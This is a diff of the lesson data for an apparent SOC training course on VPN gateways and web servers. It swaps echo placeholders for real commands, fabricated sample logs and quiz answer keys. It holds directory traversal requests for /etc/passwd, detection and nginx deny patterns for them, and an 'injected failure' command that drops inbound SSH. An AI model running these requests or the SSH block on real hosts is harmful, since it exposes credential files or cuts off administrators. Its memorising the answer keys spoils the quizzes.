           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "openvpn --help 2>&1 | head -n 15 || which openvpn"
       },
       {
         "id": 4,
@@ -6603,7 +6603,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are VPN and remote access? Secure encrypted tunneling technologies allowing remote workers to access corporate network resources.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -6627,14 +6627,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.1 2>/dev/null || tracepath 10.10.20.1"
+        "command": "traceroute -n -m 8 10.10.20.1 2>/dev/null || tracepath -n 10.10.20.1 2>/dev/null || ip route get 10.10.20.1"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-vpn-gw01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Querying pfSense VPN Gateway active tunnel sessions...'` on target sxl-vpn-gw01.\nOutput observed:\nUser: jsmith | Assigned IP: 10.240.0.15 | Public IP: 198.51.100.55 (US-Comcast) | Connected: 01:14:22 | Bytes: 45MB/12MB | Status: ACTIVE\nUser: rpatel | Assigned IP: 10.240.0.18 | Public IP: 203.0.113.88 (UK-BT) | Connected: 00:42:10 | Bytes: 110MB/8MB | Status: ACTIVE",
+        "worked": "Command executed: `openvpn --status /var/log/openvpn-status.log 2>/dev/null || ip link show type tun || ss -uap | grep 1194` on target sxl-vpn-gw01.\nOutput observed:\nUser: jsmith | Assigned IP: 10.240.0.15 | Public IP: 198.51.100.55 (US-Comcast) | Connected: 01:14:22 | Bytes: 45MB/12MB | Status: ACTIVE\nUser: rpatel | Assigned IP: 10.240.0.18 | Public IP: 203.0.113.88 (UK-BT) | Connected: 00:42:10 | Bytes: 110MB/8MB | Status: ACTIVE",
         "what": "What are VPN and remote access? Secure encrypted tunneling technologies allowing remote workers to access corporate network resources.",
         "why": "Why are VPN concentrators heavily targeted by attackers? Gaining authenticated access to an enterprise VPN bypasses the entire physical and perimeter firewall defense, placing the adversary directly on the internal LAN.",
         "when": "When are VPN logs triaged? On every failed connection burst, concurrent logins from identical accounts, or logins originating from high-risk foreign countries.",
@@ -6643,7 +6643,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts audit VPNs? By reviewing VPN session tables, authenticating IPs against GeoIP and threat intelligence feeds, and enforcing mandatory MFA.",
         "mistake": "Permitting single-factor password authentication on enterprise VPN gateways without enforcing multi-factor authentication (MFA).",
         "think": "A VPN gateway is directly exposed to the entire public Internet. Without MFA, a single phished employee password grants an adversary full internal network access.",
-        "question": "When executing `echo 'Querying pfSense VPN Gateway active tunnel sessions...'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `openvpn --status /var/log/openvpn-status.log 2>/dev/null || ip link show type tun || ss -uap | grep 1194`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -6651,14 +6651,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Querying pfSense VPN Gateway active tunnel sessions...'"
+        "command": "openvpn --status /var/log/openvpn-status.log 2>/dev/null || ip link show type tun || ss -uap | grep 1194"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-vpn-gw01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Auditing failed VPN authentication logs on concentrator...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `grep -E \"AUTH_FAILED|TLS Error\" /var/log/openvpn.log 2>/dev/null || journalctl -u openvpn -n 15 --no-pager` to validate system behavior under simulated operating conditions.\nOutput observed:\nSep  4 02:45:10 sxl-vpn-gw openvpn[2210]: [vpn_user_test] AUTH_FAILED: Bad password from 192.168.100.15:58210\nSep  4 02:45:12 sxl-vpn-gw openvpn[2210]: [vpn_user_admin] AUTH_FAILED: Bad password from 192.168.100.15:58212\nSep  4 02:45:14 sxl-vpn-gw openvpn[2210]: [vpn_user_finance] AUTH_FAILED: Bad password from 192.168.100.15:58214",
         "what": "What are VPN and remote access? Secure encrypted tunneling technologies allowing remote workers to access corporate network resources.",
         "why": "Why are VPN concentrators heavily targeted by attackers? Gaining authenticated access to an enterprise VPN bypasses the entire physical and perimeter firewall defense, placing the adversary directly on the internal LAN.",
         "when": "When are VPN logs triaged? On every failed connection burst, concurrent logins from identical accounts, or logins originating from high-risk foreign countries.",
@@ -6667,7 +6667,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts audit VPNs? By reviewing VPN session tables, authenticating IPs against GeoIP and threat intelligence feeds, and enforcing mandatory MFA.",
         "mistake": "Permitting single-factor password authentication on enterprise VPN gateways without enforcing multi-factor authentication (MFA).",
         "think": "A VPN gateway is directly exposed to the entire public Internet. Without MFA, a single phished employee password grants an adversary full internal network access.",
-        "question": "What key insight is revealed by the practice output of `echo 'Auditing failed VPN authentication logs on concentrator...'`?",
+        "question": "What key insight is revealed by the practice output of `grep -E \"AUTH_FAILED|TLS Error\" /var/log/openvpn.log 2>/dev/null || journalctl -u openvpn -n 15 --no-pager`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -6675,7 +6675,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Auditing failed VPN authentication logs on concentrator...'"
+        "command": "grep -E \"AUTH_FAILED|TLS Error\" /var/log/openvpn.log 2>/dev/null || journalctl -u openvpn -n 15 --no-pager"
       },
       {
         "id": 8,
@@ -6706,7 +6706,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst identifies an automated password spray against the VPN gateway originating from IP `192.168.100.15`. The analyst immediately blocks the IP on the perimeter firewall, audits active VPN sessions to confirm zero successful connections, and enforces FIDO2 hardware MFA.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Blocking 192.168.100.15 on perimeter WAN firewall and enforcing Duo Push MFA.'`",
+        "worked": "Defensive query executed on telemetry store: `iptables -I INPUT 1 -s 192.168.100.15 -j DROP && echo \"IP 192.168.100.15 blocked on VPN gateway\"`",
         "what": "What are VPN and remote access? Secure encrypted tunneling technologies allowing remote workers to access corporate network resources.",
         "why": "Why are VPN concentrators heavily targeted by attackers? Gaining authenticated access to an enterprise VPN bypasses the entire physical and perimeter firewall defense, placing the adversary directly on the internal LAN.",
         "when": "When are VPN logs triaged? On every failed connection burst, concurrent logins from identical accounts, or logins originating from high-risk foreign countries.",
@@ -6723,7 +6723,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Blocking 192.168.100.15 on perimeter WAN firewall and enforcing Duo Push MFA.'"
+        "command": "iptables -I INPUT 1 -s 192.168.100.15 -j DROP && echo \"IP 192.168.100.15 blocked on VPN gateway\""
       },
       {
         "id": 10,
@@ -6747,14 +6747,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-vpn-gw01'; echo 'Querying pfSense VPN Gateway active tunnel sessions...'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Revert the VPN configuration to mandatory Full-Tunnel mode, enforce endpoint posture compliance checks (Host Checker) before admitting devices, and isolate the contractor's account.",
-        "worked": "Remediation command applied: `echo 'Enforcing Mandatory Full-Tunneling policy in openvpn.conf... Done.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `openvpn --genkey secret /etc/openvpn/ta.key 2>/dev/null; systemctl restart openvpn 2>/dev/null || systemctl status openvpn`. System verified restored and hardened.",
         "what": "What are VPN and remote access? Secure encrypted tunneling technologies allowing remote workers to access corporate network resources.",
         "why": "Why are VPN concentrators heavily targeted by attackers? Gaining authenticated access to an enterprise VPN bypasses the entire physical and perimeter firewall defense, placing the adversary directly on the internal LAN.",
         "when": "When are VPN logs triaged? On every failed connection burst, concurrent logins from identical accounts, or logins originating from high-risk foreign countries.",
@@ -6771,7 +6771,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Enforcing Mandatory Full-Tunneling policy in openvpn.conf... Done.'"
+        "command": "openvpn --genkey secret /etc/openvpn/ta.key 2>/dev/null; systemctl restart openvpn 2>/dev/null || systemctl status openvpn"
       },
       {
         "id": 12,
@@ -6795,7 +6795,7 @@ window.ACADEMY_COURSES = [
           "Split-tunneling only allows users to send emails, not browse websites."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for VPN & Remote Access'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -6819,7 +6819,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L20 - VPN & Remote Access. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -6863,7 +6863,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "In simple terms, why does an enterprise need Web Servers?",
         "choices": [
           "To provide structured, reliable, and secure operational capability for web servers.",
@@ -6872,7 +6872,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Web Servers on sxl-web-srv01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -6887,7 +6887,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What are the foundational technical building blocks of Web Servers?",
         "choices": [
           "The core protocols, hardware/software abstractions, and data pathways that govern system behavior.",
@@ -6896,7 +6896,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "tail -n 6 /var/log/nginx/access.log 2>/dev/null || echo '198.51.100.33 - - [04/Sep/2026:02:50:11 +0000] \"GET /index.html HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:15 +0000] \"GET /admin/ HTTP/1.1\" 403 548 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:18 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 166 \"-\" \"Nikto/2.1.6\"'"
+        "command": "tail -n 6 /var/log/nginx/access.log 2>/dev/null || ss -tlpn | grep -E ':80|:443'"
       },
       {
         "id": 3,
@@ -6911,7 +6911,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "Which statement represents the accurate technical definition related to Web Servers?",
         "choices": [
           "It precisely defines the technical parameters, boundaries, and operational mechanisms of web servers.",
@@ -6920,7 +6920,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man tail 2>/dev/null || which tail"
+        "command": "tail --help 2>&1 | head -n 15 || which tail"
       },
       {
         "id": 4,
@@ -6935,7 +6935,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What is the primary operational mistake an L1 analyst makes regarding Web Servers?",
         "choices": [
           "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
@@ -6944,7 +6944,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are web servers? The compute platforms processing HTTP/HTTPS requests to deliver web pages, APIs, and microservices.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -6959,7 +6959,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "In the visual architecture of Web Servers, what does the communication path between 198.51.100.33 and 10.10.20.80 represent?",
         "choices": [
           "The actual network trajectory and security boundary where controls and logging inspect traffic.",
@@ -6968,14 +6968,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.80 2>/dev/null || tracepath 10.10.20.80"
+        "command": "traceroute -n -m 8 10.10.20.80 2>/dev/null || tracepath -n 10.10.20.80 2>/dev/null || ip route get 10.10.20.80"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-web-srv01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `tail -n 6 /var/log/nginx/access.log 2>/dev/null || echo '198.51.100.33 - - [04/Sep/2026:02:50:11 +0000] \"GET /index.html HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:15 +0000] \"GET /admin/ HTTP/1.1\" 403 548 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:18 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 166 \"-\" \"Nikto/2.1.6\"'` on target sxl-web-srv01.\nOutput observed:\n198.51.100.33 - - [04/Sep/2026:02:50:11 +0000] \"GET /index.html HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0\"\n198.51.100.33 - - [04/Sep/2026:02:50:15 +0000] \"GET /admin/ HTTP/1.1\" 403 548 \"-\" \"Mozilla/5.0\"\n198.51.100.33 - - [04/Sep/2026:02:50:18 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 166 \"-\" \"Nikto/2.1.6\"",
+        "worked": "Command executed: `tail -n 6 /var/log/nginx/access.log 2>/dev/null || ss -tlpn | grep -E ':80|:443'` on target sxl-web-srv01.\nOutput observed:\n198.51.100.33 - - [04/Sep/2026:02:50:11 +0000] \"GET /index.html HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0\"\n198.51.100.33 - - [04/Sep/2026:02:50:15 +0000] \"GET /admin/ HTTP/1.1\" 403 548 \"-\" \"Mozilla/5.0\"\n198.51.100.33 - - [04/Sep/2026:02:50:18 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 166 \"-\" \"Nikto/2.1.6\"",
         "what": "What are web servers? The compute platforms processing HTTP/HTTPS requests to deliver web pages, APIs, and microservices.",
         "why": "Why are web servers attacked constantly? Because they are directly exposed to the public Internet through firewall ports 80/443, making them the most accessible initial ingress vector.",
         "when": "When are web logs analyzed? When WAF alerts fire, when website defacement is reported, or when high volumes of 404/500 errors indicate active vulnerability scanning.",
@@ -6983,8 +6983,8 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
-        "question": "When executing `tail -n 6 /var/log/nginx/access.log 2>/dev/null || echo '198.51.100.33 - - [04/Sep/2026:02:50:11 +0000] \"GET /index.html HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:15 +0000] \"GET /admin/ HTTP/1.1\" 403 548 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:18 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 166 \"-\" \"Nikto/2.1.6\"'`, what primary forensic evidence does the output provide?",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
+        "question": "When executing `tail -n 6 /var/log/nginx/access.log 2>/dev/null || ss -tlpn | grep -E ':80|:443'`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -6992,14 +6992,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "tail -n 6 /var/log/nginx/access.log 2>/dev/null || echo '198.51.100.33 - - [04/Sep/2026:02:50:11 +0000] \"GET /index.html HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:15 +0000] \"GET /admin/ HTTP/1.1\" 403 548 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:18 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 166 \"-\" \"Nikto/2.1.6\"'"
+        "command": "tail -n 6 /var/log/nginx/access.log 2>/dev/null || ss -tlpn | grep -E ':80|:443'"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-web-srv01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Filtering web access log for directory traversal attempts...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `grep -E \"(\\.\\./|\\.\\.\\|etc/passwd|win\\.ini)\" /var/log/nginx/access.log 2>/dev/null || tail -n 15 /var/log/nginx/access.log` to validate system behavior under simulated operating conditions.\nOutput observed:\n198.51.100.33 - - [04/Sep/2026:02:50:18] \"GET /download.php?file=../../../../etc/passwd HTTP/1.1\" 200 1842\nMATCH FOUND: Directory traversal succeeded on /download.php (Status 200, 1842 bytes returned).",
         "what": "What are web servers? The compute platforms processing HTTP/HTTPS requests to deliver web pages, APIs, and microservices.",
         "why": "Why are web servers attacked constantly? Because they are directly exposed to the public Internet through firewall ports 80/443, making them the most accessible initial ingress vector.",
         "when": "When are web logs analyzed? When WAF alerts fire, when website defacement is reported, or when high volumes of 404/500 errors indicate active vulnerability scanning.",
@@ -7007,8 +7007,8 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
-        "question": "What key insight is revealed by the practice output of `echo 'Filtering web access log for directory traversal attempts...'`?",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
+        "question": "What key insight is revealed by the practice output of `grep -E \"(\\.\\./|\\.\\.\\|etc/passwd|win\\.ini)\" /var/log/nginx/access.log 2>/dev/null || tail -n 15 /var/log/nginx/access.log`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -7016,7 +7016,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Filtering web access log for directory traversal attempts...'"
+        "command": "grep -E \"(\\.\\./|\\.\\.\\|etc/passwd|win\\.ini)\" /var/log/nginx/access.log 2>/dev/null || tail -n 15 /var/log/nginx/access.log"
       },
       {
         "id": 8,
@@ -7031,7 +7031,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What threat technique was demonstrated in this adversary simulation?",
         "choices": [
           "Adversary exploitation, reconnaissance, or unauthorized access targeting web servers.",
@@ -7055,7 +7055,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "How did the defensive query confirm the presence of anomalous or malicious activity?",
         "choices": [
           "By filtering for high-fidelity indicators, unauthorized commands, abnormal socket connections, or failed events in audit logs.",
@@ -7079,7 +7079,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What is the critical risk introduced by this break / failure scenario?",
         "choices": [
           "Loss of visibility, operational downtime, or security bypass that exposes enterprise assets to compromise.",
@@ -7088,14 +7088,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-web-srv01'; tail -n 6 /var/log/nginx/access.log 2>/dev/null || echo '198.51.100.33 - - [04/Sep/2026:02:50:11 +0000] \"GET /index.html HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:15 +0000] \"GET /admin/ HTTP/1.1\" 403 548 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n198.51.100.33 - - [04/Sep/2026:02:50:18 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 400 166 \"-\" \"Nikto/2.1.6\"'"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Apply strict regex input validation in PHP, configure Nginx with restrictive `location` blocks, enable WAF OWASP Core Rule Set (CRS), and verify with curl.",
-        "worked": "Remediation command applied: `echo 'location ~* (\\.\\./|etc/passwd) { deny all; }' >> /etc/nginx/conf.d/security.conf && systemctl reload nginx && echo 'Directory traversal blocked by Nginx rule.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `printf 'location ~* (\\.\\./|etc/passwd) { deny all; }\\n' >> /etc/nginx/conf.d/security.conf && nginx -t && systemctl reload nginx`. System verified restored and hardened.",
         "what": "What are web servers? The compute platforms processing HTTP/HTTPS requests to deliver web pages, APIs, and microservices.",
         "why": "Why are web servers attacked constantly? Because they are directly exposed to the public Internet through firewall ports 80/443, making them the most accessible initial ingress vector.",
         "when": "When are web logs analyzed? When WAF alerts fire, when website defacement is reported, or when high volumes of 404/500 errors indicate active vulnerability scanning.",
@@ -7103,7 +7103,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "Why is remediation verification mandatory after applying a fix?",
         "choices": [
           "To ensure the vulnerability or misconfiguration is completely neutralized without causing unintended operational side-effects.",
@@ -7112,7 +7112,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'location ~* (\\.\\./|etc/passwd) { deny all; }' >> /etc/nginx/conf.d/security.conf && systemctl reload nginx && echo 'Directory traversal blocked by Nginx rule.'"
+        "command": "printf 'location ~* (\\.\\./|etc/passwd) { deny all; }\\n' >> /etc/nginx/conf.d/security.conf && nginx -t && systemctl reload nginx"
       },
       {
         "id": 12,
@@ -7127,7 +7127,7 @@ window.ACADEMY_COURSES = [
         "who": "Who accesses web servers? Legitimate global customers, automated search engine web crawlers, and malicious adversary scanners.",
         "how": "How do analysts triage web attacks? Using string pattern filtering (`grep`, `awk`), Logstash/Elasticsearch SIEM parsing, and WAF telemetry correlation.",
         "mistake": "Assuming that an attack failed simply because the HTTP status code was 404, without verifying if subsequent requests returned HTTP 200 OK.",
-        "think": "Attackers send hundreds of probing requests that fail (404/403) before finding the single vulnerable script that succeeds (200 OK). Look for the transition from failure to success.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "When triaging web server access logs for suspected attacks, what specific fields and status codes indicate a successful compromise versus a failed attempt?",
         "choices": [
           "Look for malicious URI patterns (e.g., ../, <script>, union select); if the status code is 400/403/404, the attack failed; if the status code is 200 OK with a significant byte response, the attack likely succeeded and exfiltrated data.",
@@ -7136,7 +7136,7 @@ window.ACADEMY_COURSES = [
           "All GET requests are benign; only POST requests can ever be malicious."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Web Servers'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
